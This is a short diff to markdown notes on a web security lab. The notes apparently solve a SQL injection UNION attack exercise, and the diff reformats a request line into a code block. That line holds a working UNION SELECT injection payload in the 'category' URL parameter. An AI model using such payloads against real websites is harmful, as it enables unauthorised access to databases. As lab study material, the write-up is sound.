@@ -112,7 +112,9 @@ solve the lab, perform an SQL injection UNION attack that returns an additional 
 **hint:** Make the database retrieve the string: 'g0cl1S'
 
 after finding unmber of columns (see previous lab):
-> GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+NULL+FROM+information_schema.tables--+ HTTP/1.1
+```
+GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+NULL+FROM+information_schema.tables--+ HTTP/1.1
+```
 
 we replace NULL value with random string provided: 'g0cl1S'
 
